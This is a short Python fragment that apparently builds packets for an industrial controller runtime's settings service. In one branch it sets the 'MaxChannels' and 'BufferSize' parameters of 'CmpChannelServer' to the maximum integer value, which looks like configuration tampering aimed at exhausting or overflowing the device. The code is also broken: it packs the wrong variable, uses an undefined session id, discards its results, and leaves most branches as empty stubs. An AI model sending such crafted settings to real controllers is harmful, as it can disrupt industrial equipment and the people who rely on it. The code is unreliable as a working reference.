SERVICE_GRP = 0x06
SERVICE_HANDLER_ADDRESS=0x55555

def SettgSetIntValue(sess_id, section, parameter, value):
    cmp = btag(0x10, section + '\x00')
    key = btag(0x11, parameter + '\x00')
    val = btag(0x12, pack('<i', value))
    data = btag(0x81, cmp + key + value)
    L7 = layer7(SERVICE_GRP, 2, sess_id, data)
    return L7


def CmpSettingsCmd(cmd_id):
    if cmd_id == 0x06:
        # READ_SETTINGS
        pass
    elif cmd_id == 0x07:
        # WRITE_SETTINGS
        pass
    elif cmd_id == 0x01:
        # GET_INT_VALUE
        pass
    elif cmd_id == 0x02:
        # SET_INT_VALUE
        L7 = SettgSetIntValue(sess_id, 'CmpChannelServer', 'MaxChannels', 0x7fffffff)
        L7 = SettgSetIntValue(sess_id, 'CmpChannelServer', 'BufferSize', 0x7fffffff)
        pass
    elif cmd_id == 0x03:
        # GET_STRING_VALUE
        pass
    elif cmd_id == 0x04:
        # SET_STRING_VALUE
        pass
    elif cmd_id == 0x05:
        # REMOVE_KEY
        pass
    else:
        # "No such command"
        return
